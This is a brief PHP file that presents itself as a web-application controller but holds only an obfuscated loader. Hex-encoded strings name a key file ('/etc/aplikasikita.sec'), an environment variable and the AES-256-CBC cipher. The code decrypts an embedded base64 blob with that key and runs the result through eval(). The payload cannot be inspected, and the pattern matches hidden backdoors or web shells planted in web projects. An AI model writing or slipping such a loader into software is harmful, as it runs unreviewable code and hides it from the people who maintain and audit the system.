<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+PN468/33jvFH6219s4Bvw==');

$c=base64_decode(

'XUHCKPzZLg9kHDvSx4Mg/XnffJ/1kvsI+Z4cnA2XzX2qkwZAmbMRuzFw+wBHbgVbdB7NWiw1XdSQ' .
'ziJpEws0k9aMGgi7vDB4RYLhOu89LYQTE41nTrhQw4L5Lxuqzbskb/lRYudpVQAs23270rAxayFt' .
'SQCqk7BUmFnfAbV6cFibSqS449PaU+XJs7MxP1tXtGjsMs7yON5cRE4iNwWzWrnByHuJnL94OL1d' .
'P2U73dH7Kg5P/8w1kqI+kSR0y+ux'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

